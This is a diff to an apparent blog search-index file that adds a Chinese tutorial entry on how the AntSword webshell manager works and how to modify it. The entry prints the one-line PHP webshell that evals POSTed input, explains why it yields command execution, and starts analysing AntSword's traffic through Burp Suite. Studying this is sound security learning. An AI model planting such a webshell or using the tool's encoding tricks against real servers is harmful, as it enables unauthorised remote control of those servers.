@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>蚁剑原理与魔改</title>
+      <link href="/posts/8e46.html"/>
+      <url>/posts/8e46.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h2><p>一句话木马形如这样：</p><pre><code>&lt;?php @eval($_POST[password]);?&gt;</code></pre><p>使用蚁剑连接，连接成功<br><img src="/images/pasted-216.png" alt="upload successful"><br>那为什么能成功呢？<br>首先要探寻一句话木马的原理<br><img src="/images/pasted-217.png" alt="upload successful"><br>所以我们post传入的字符串会以php代码的形式运行，而php代码又能调用系统操作所以便成了木马<br><img src="/images/pasted-218.png" alt="upload successful"></p><h2 id="蚁剑的原理"><a href="#蚁剑的原理" class="headerlink" title="蚁剑的原理"></a>蚁剑的原理</h2><p>知道了一句话木马的原理，那么我们康康蚁剑的原理，蚁剑用很多功能确实很方便。还支持编码，垃圾数值，随机数，自定义编码解码器。<br><img src="/images/pasted-219.png" alt="upload successful"><br>首先选择代理设置，因为这里我们选择用burpsuite来抓取流量，<br><img src="/images/pasted-220.png" alt="upload successful"><br><img src="/images/pasted-221.png" alt="upload successful"><br><img src="/images/pasted-222.png" alt="upload successful"><br>蚁剑连接来分析一下流量</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>DC5-靶机</title>
       <link href="/posts/328c.html"/>
       <url>/posts/328c.html</url>
